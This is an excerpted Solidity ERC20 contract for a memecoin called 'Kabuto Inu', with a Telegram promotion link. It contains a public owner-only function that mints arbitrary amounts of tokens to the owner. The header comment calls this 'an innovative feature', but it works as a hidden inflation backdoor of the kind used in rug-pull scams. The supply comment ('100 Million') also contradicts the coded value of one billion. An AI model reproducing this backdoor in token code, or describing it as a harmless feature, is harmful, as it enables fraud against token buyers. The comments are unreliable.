...
//
// $KabutoInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/KabutoInu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _KabutoInu(uint256 amount) public onlyOwner {
 _KabutoInu(msg.sender, amount);
    }
    ...
    function _KabutoInu(address account, uint256 amount) internal virtual {
...
contract $KabutoInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Kabuto Inu", " KABUTOINU ") {
     _KabutoInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}